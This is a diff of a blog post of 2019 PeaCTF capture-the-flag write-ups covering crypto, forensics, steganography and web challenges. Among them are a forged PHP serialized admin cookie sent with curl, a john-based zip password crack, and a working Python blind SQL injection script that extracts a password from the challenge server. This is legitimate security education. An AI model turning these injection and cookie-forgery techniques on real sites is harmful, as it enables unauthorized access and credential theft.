@@ -1,6 +1,6 @@
 ---
 layout: post
-title: 	"PeaCTF Qualifier Round: All Challenges"
+title: 	"PeaCTF Qualifiers (13th Place): All Challenges"
 date:	2019-07-28 12:00:00 +0000
 categories: writeups peactf
 ---
@@ -94,7 +94,7 @@ categories: writeups peactf
   </ul>
 </div>
 
-PeaCTF ran from the 22nd of July until the 28th of July. The following are my writeups for all the challenges.
+PeaCTF ran from the 22nd of July until the 28th of July. The following are my writeups for all the challenges. I participated solo and managed to achieve 13th place out of about 500 teams.
 
 A quick note before we begin: If you intend on following each writeup, make sure you do the challenges yourself. Different accounts get different "instances" of the challenges and will therefore have different flags.
 
@@ -113,7 +113,7 @@ an easy flag. Don’t forget to capitalize CTF! [Ciphertext](https://shell1.2019
 
 We get a file 'enc.txt'. Let's see what it says.
 ```shell
-~/Documents/peactf/breakfast_COMPLETE# cat enc.txt
+» cat enc.txt
 011100010000000000101001000101{00100001100011010100000000010100101010100010010001}
 ```
 
@@ -137,13 +137,13 @@ Flag: `peaCTF{eggwaffles}`
 
 We get a file 'enc.txt'. Let's see what it says.
 ```shell
-~/Documents/peactf/broken_keyboard_COMPLETE# cat enc.txt
+» cat enc.txt
 112 101 97 67 84 70 123 52 115 99 49 49 105 115 99 48 48 108 125
 ```
 
 Looks just like ascii values.
 ```shell
-~/Documents/peactf/broken_keyboard_COMPLETE# python
+» python
 Python 2.7.16 (default, Apr  6 2019, 01:42:57) 
 [GCC 8.3.0] on linux2
 Type "help", "copyright", "credits" or "license" for more information.
@@ -176,7 +176,7 @@ Flag: `peaCTF{4sc11isc00l}`
 
 0o670 is octal 670. We change it to decimal.
 ```shell
-~/Documents/peactf# python
+» python
 Python 2.7.16 (default, Apr  6 2019, 01:42:57) 
 [GCC 8.3.0] on linux2
 Type "help", "copyright", "credits" or "license" for more information.
@@ -252,7 +252,7 @@ Flag: `flag{peactf_linux_is_fun_bb6f529aa108b7d7021c00833742fe7a}`
 
 Looking at the enc.txt file given.
 ```shell
-~/Documents/peactf/school_COMPLETE# cat enc.txt
+» cat enc.txt
 Alphabet: ​WCGPSUHRAQYKFDLZOJNXMVEBTI
 zswGXU{ljwdhsqmags}
 ```
@@ -292,10 +292,10 @@ Flag: `peaCTF{orangejuice}`
 We run file against the master-ball file, see its RAR archive. Unrar it, see the next file is a zip archive. Unzip that, get a PDF file.
 
 ```shell
-~/Documents/peactf/choose_your_pokemon_COMPLETE# file master-ball
+» file master-ball
 master-ball: RAR archive data, v5
 -----------------------------------------------------------------------------------
-~/Documents/peactf/choose_your_pokemon_COMPLETE# unrar x master-ball
+» unrar x master-ball
 
 UNRAR 5.61 beta 1 freeware      Copyright (c) 1993-2018 Alexander Roshal
 
@@ -305,26 +305,26 @@ Extracting from master-ball
 Extracting  roshambo                                                  OK 
 All OK
 -----------------------------------------------------------------------------------
-~/Documents/peactf/choose_your_pokemon_COMPLETE# file roshambo
+» file roshambo
 roshambo: Zip archive data, at least v2.0 to extract
 -----------------------------------------------------------------------------------
-~/Documents/peactf/choose_your_pokemon_COMPLETE# unzip roshambo
+» unzip roshambo
 Archive:  roshambo
   inflating: inDesign                
 -----------------------------------------------------------------------------------
-~/Documents/peactf/choose_your_pokemon_COMPLETE# file inDesign
+» file inDesign
 inDesign: PDF document, version 1.7
 ```
 
 Opening the PDF file gives us a link to [https://pastebin.com/AWTDEb9j](https://pastebin.com/AWTDEb9j). I copied all the data from there into a file and ran file against it. I guessed that it would be rtf beforehand since the very first line starts with `{\rtf1\adeflang1025`.
 ```shell
-~/Documents/peactf/choose_your_pokemon_COMPLETE# file flag.rtf
+» file flag.rtf
 flag.rtf: Rich Text Format data, version 1, unknown character set
 ```
 
 I used unrtf to convert the rtf file to normal text.
 ```shell
-~/Documents/peactf/choose_your_pokemon_COMPLETE# unrtf --text flag.rtf
+» unrtf --text flag.rtf
 ###  Translation from RTF performed by UnRTF, version 0.21.10 
 ### font table contains 101 fonts total
 ### creation date: 20 July 2019 22:34 
@@ -418,13 +418,13 @@ Flag: `peaCTF{nice_cup_of_coffee}`
 
 We are given this weird file with a .xtr extension. Google doesn't give us much. Running `file` against it tells us its just data.
 ```shell
-~/Documents/peactf/we_are_extr_COMPLETE# file E.xtr
+» file E.xtr
 E.xtr: data
 ```
 
 Using xxd, I checked the first few bytes of the file.
 ```shell
-~/Documents/peactf/we_are_extr_COMPLETE# xxd E.xtr
+» xxd E.xtr
 00000000: 8958 5452 0d0a 1a0a 0000 000d 4948 4452  .XTR........IHDR
 00000010: 0000 0500 0000 02d0 0803 0000 018f a41d  ................
 00000020: f200 0000 0173 5247 4200 aece 1ce9 0000  .....sRGB.......
@@ -464,7 +464,7 @@ Flag: `{read_banned_it}`
 
 Looking at the given ciphertext.
 ```shell
-~/Documents/peactf/crack_the_key_COMPLETE# cat enc.txt 
+» cat enc.txt 
 DVMDVRWOUISIERRRGNNVMWPOPGTOHSBUIHTCSSMJIVUWEXHTCTKZKFXIENWTDDOVMEOWDZRQEBQPVLFWKJBGL
 EEDALGCIVLQGLTWTCMFXSIAQTLTUGZQZZWOPVGIRCSLRUZRJUZBQSXSPXGJMGTPRPUGRSIVRGUDAFXHTNLVVBMF
 ZMQSFUWTWTFSWHIGXHTQLGCUSRGLEIWWXXWWCJDAIFXGAPDWGWFHTZSVOBISITRVUTTVRTWTDGMCPHGGNRDB
@@ -530,13 +530,13 @@ Flag: `peaCTF{redpineapples}`
 
 Typical RSA challenge. We get given two files.
 ```shell
-~/Documents/peactf/rsa_COMPLETE# cat auth_channel.txt   
+» cat auth_channel.txt   
 Authenticated (unhashed) channel:
 n = 59883006898206291499785811163190956754007806709157091648869
 e = 65537
 c = 23731413167627600089782741107678182917228038671345300608183
 ----------------------------------------------------------------------------------
-~/Documents/peactf/rsa_COMPLETE# cat enc_channel.txt  
+» cat enc_channel.txt  
 Encrypted channel:
 n = 165481207658568424313022356820498512502867488746572300093793
 e = 65537
@@ -555,9 +555,9 @@ n = 59883006898206291499785811163190956754007806709157091648869
 e = 65537
 c = 23731413167627600089782741107678182917228038671345300608183
 m = pow(c, e, n)
-m_ascii = hex(m)[2:-1]
+m_hex = hex(m)[2:-1]
 
-print m_ascii.decode('hex') # outputs '1ng1sfun}''
+print m_hex.decode('hex') # outputs '1ng1sfun}''
 ```
 
 That gives us the second half of the flag. In order to get the first half, we have to decrypt the actual message sent in the enc message. If you are completely unfamiliar with how the RSA cryptosystem works, I suggest you read the wikipedia page linked above. I used [factordb](http://factordb.com) to check if n was able to be factorized, and it turns out it is. I then wrote a simple script to calculate the private key and decrypt the message.
@@ -572,9 +572,9 @@ n = p*q
 d = inverse(e, phi)
 c = 150635433712900935381157860417761227624682377134647578768653
 m = pow(c, d, n)
-m_asc = hex(m)[2:-1]
+m_hex = hex(m)[2:-1]
 
-print m_asc.decode('hex') # outputs 'peaCTF{f4ct0r'
+print m_hex.decode('hex') # outputs 'peaCTF{f4ct0r'
 ```
 
 Combining the outputs, we get the flag.
@@ -633,7 +633,7 @@ if (!empty($_COOKIE['user'])) {
 
 It takes a cookie named 'user', first makes sure it's not empty, the unserializes it, calls `$user->is_admin()` and gives us the flag only if it returns true. This tells me that the cookie is actually an object that is serialized and stored as the cookie (in its 'value' field). 
 
-I used [writephponline](http://www.writephponline.com/) to write my own class for this object. I had to make an 'educated guess' on how the `is_admin()` function worked. After a little bit of trial and error, this worked. The hint of the challenge also helps a lot.
+I used [writephponline](http://www.writephponline.com/) to write my own class for this object. I had to make an 'educated guess' on how the `is_admin()` function worked as well as what the class field was called. My first guess of $admin turned out working. The hint of the challenge also helps a lot.
 ```php
 class User
 {
@@ -653,7 +653,7 @@ echo serialize($a);
 
 Then I url encoded output from above and used curl. Curl wouldn't work without at least url encoding or escaping out the quotes and colons from the above output.
 ```shell
-~/Documents/peactf/educated_guess_COMPLETE# curl --cookie "user=O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22admin%22%3Bb%3A1%3B%7D" http://shell1.2019.peactf.com:1428/query.php
+» curl --cookie "user=O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22admin%22%3Bb%3A1%3B%7D" http://shell1.2019.peactf.com:1428/query.php
 <!doctype html>
 <html>
 <head>
@@ -683,8 +683,8 @@ We are given an image. First thing I always do is run stegsolve on images. I let
 ![blue_plane_3](/images/peactf/blue_plane_3.png){:height="250px"}
 
 I used python to decode the hex.
-```python
-~/Documents/peactf/the_wonderful_wizard_COMPLETE# python                                                                                                                                                root@kali
+```shell
+» python
 Python 2.7.16 (default, Apr  6 2019, 01:42:57) 
 [GCC 8.3.0] on linux2
 Type "help", "copyright", "credits" or "license" for more information.
@@ -714,7 +714,7 @@ Flag: `flag{peactf_where_the_wind_blows}`
 
 We are given a zip file that is password protected. I just chose to brute force the password using john.
 ```shell
-~/boxes/kali » zip2john song_of_my_people.zip > song.hash
+» zip2john song_of_my_people.zip > song.hash
 ver 2.0 efh 9901 song_of_my_people.zip/Ice Cube - Check Yo Self Remix (Clean).mp3 PKZIP Encr: cmplen=5550839, decmplen=5601208, crc=3F7D5D
 ver 2.0 efh 9901 song_of_my_people.zip/README.txt PKZIP Encr: cmplen=132, decmplen=123, crc=E3A5855B
 ver 2.0 efh 9901 song_of_my_people.zip/a lengthy issue.png PKZIP Encr: cmplen=42909, decmplen=44525, crc=6514CE68
@@ -722,7 +722,7 @@ NOTE: It is assumed that all files in each archive have the same password.
 If that is not the case, the hash may be uncrackable. To avoid this, use
 option -o to pick a file at a time.
 ----------------------------------------------------------------------------------------------------------------------------------------------
-~/boxes/kali » john --wordlist=~/tools/wordlists/rockyou.txt song.hash
+» john --wordlist=~/tools/wordlists/rockyou.txt song.hash
 Warning: detected hash type "ZIP", but the string is also recognized as "ZIP-opencl"
 Use the "--format=ZIP-opencl" option to force loading these as that type instead
 Using default input encoding: UTF-8
@@ -737,7 +737,7 @@ Session completed
 
 We get the password as 'violin' (4th last line) almost instantly. Once we extract the contents with 7zip, we get the following files.
 ```shell
-~/Documents/peactf/song_of_my_people_COMPLETE# ls
+» ls
 'a lengthy issue.png'  'Ice Cube - Check Yo Self Remix (Clean).mp3'   README.txt   song_of_my_people.zip
 ```
 
@@ -750,7 +750,7 @@ does any of this ADD up? This is a LONG problem.
 
 I ran exiftool against the png file and got this.
 ```shell
-~/Documents/peactf/song_of_my_people_COMPLETE# exiftool file.png 
+» exiftool file.png 
 ExifTool Version Number         : 11.56
 File Name                       : file.png
 Directory                       : .
@@ -782,7 +782,7 @@ I will save time now and just say that I went through the mp3 file with both Son
 
 Running pngcheck on the image.
 ```shell
-~/Documents/peactf/song_of_my_people_COMPLETE# pngcheck -vf file.png 
+» pngcheck -vf file.png 
 File: file.png (44525 bytes)
   chunk IHDR at offset 0x0000c, length 13
     1280 x 720 image, 8-bit palette, interlaced
@@ -797,10 +797,10 @@ ERRORS DETECTED in file.png
 
 Okay so it says the PLTE chunk has an invalid number of entries. I used the [wikipedia page](https://en.wikipedia.org/wiki/Portable_Network_Graphics) as a reference to see what was actually wrong with the PNG file. It tells us that a PNG file must have four **critical** chunks (one of which it can have multiples of), and as many optional **ancillary** chunks as it needs. The four critical chunks are as follows:
 
-* IHDR must be the first chunk; it contains (in this order) the image's width (4 bytes), height (4 bytes), bit depth (1 byte), color type (1 byte), compression method (1 byte), filter method (1 byte), and interlace method (1 byte) (13 data bytes total).
-* PLTE contains the palette; list of colors.
-* IDAT contains the image, which may be split among multiple IDAT chunks. Such splitting increases filesize slightly, but makes it possible to generate a PNG in a streaming manner. The IDAT chunk contains the actual image data, which is the output stream of the compression algorithm.
-* IEND marks the image end.
+* **IHDR** must be the first chunk; it contains (in this order) the image's width (4 bytes), height (4 bytes), bit depth (1 byte), color type (1 byte), compression method (1 byte), filter method (1 byte), and interlace method (1 byte) (13 data bytes total).
+* **PLTE** contains the palette; list of colors.
+* **IDAT** contains the image, which may be split among multiple IDAT chunks. Such splitting increases filesize slightly, but makes it possible to generate a PNG in a streaming manner. The IDAT chunk contains the actual image data, which is the output stream of the compression algorithm.
+* **IEND** marks the image end.
 
 We also know that a chunk layout is as follows.
 
@@ -840,7 +840,7 @@ this concert is part of a larger tour that is archived completely in some kind o
 I would give you an mp3 of this audio, but I don't know how to navigate those sketchy websites.
 ```
 
-So from the above image, we know the flag format, and we are also given the page number. At this point, when it talked about the hexagonal library, I knew it was talking about the Library of Babel, so I started going through the library and did not get anywhere. I re-read the challenge description and decided to just bruteforce the flag.
+So from the above image, we know the flag format, and we are also given the page number from the soundcloud page. At this point, when it talked about the hexagonal library, I knew it was talking about the Library of Babel, so I started going through the library and did not get anywhere. I re-read the challenge description and decided to just bruteforce the flag.
 ```
 {1_thousand_spaces_371}
 {2_thousand_spaces_371}
@@ -887,16 +887,17 @@ I then checked to see if it was a blind SQLi by doing the following.
 
 Since 1 does not equal 2, the right side of the query ends up being false so the entire query returns false, causing the server to tell us that the User does not exist. Otherwise, it would tell us that it has sent an email to notify the admin about this. So we have a blind SQLi. Question is, how do we exploit it?
 
-There are two types of blind SQLi attacks that can be employed to get the password here. The first would be to use a time-based attack, and the second one would be a regexp-based attack. I used the regexp-based attack. For more information about how a regexp-based blind SQLi works, please see my tutorial [here](/guides/2019/07/25/test.html).
+There are two types of blind SQLi attacks that can be employed to get the password here. The first would be to use a time-based attack, and the second one would be a regexp-based attack. I used the regexp-based attack. For more information about how a regexp-based blind SQLi works, and a more in-depth explanation of the script below, please see my tutorial [here](/guides/2019/07/25/test.html).
 ```python
 #!/usr/bin/env python3
 
 import requests
 import sys
 
+# Helper function to easily see the query
 def blind(query):
     url = "http://shell1.2019.peactf.com:61940/result.php"
-    response = requests.post(url, data={"username":"admin'" +query+ " -- .","answer":"asd","debug":"1"})
+    response = requests.post(url, data={"username":"admin' " +query+ " -- .","answer":"asd","debug":"1"})
 
     return response
 
@@ -906,28 +907,34 @@ query_left_side = "AND 1=(SELECT 1 FROM users WHERE password LIKE '"
 
 password = ""
 
+num_of_queries = num_of_true_queries = 0
+
 while True:
+  num_of_queries += 1
     for k in keyspace:
-        query = query_left_side + k + "%')"
+        query = query_left_side + k + "%')" 
         response = blind(query)
         sys.stdout.write('\rPassword: '+password+k)
         if "Your answer to the security" in response.text:
+            num_of_true_queries += 1
             query_left_side += k
             password += k
             break
+    if num_of_queries != num_of_true_queries:
+        break
+
+print()
+print("Password found!: " + password)
 ```
 
 The script will do exactly as explained above. It tries all the letters in the keyspace, and each time it gets a "Your answer to the security" in the response body, it will concatenate the character with the actual password as well as with the query, so we can continue onwards with the next character.
 
-Note that this script will keep running forever after it finds the last character, so you would have to stop it manually.
-
 I ran it and got the password after a couple of minutes.
 ```shell
-~/Documents/peactf/philips_and_over_COMPLETE# python3 sqli.py
-Password: 70725064d
+» ./sqli.py
+Password: 70725064+
+Password found!: 70725064
 ```
-
-Note that we remove the last character as that was the final character that the script was looping over, so the actual password is '70725064'.
 
 Now we just login and we get the flag.
 
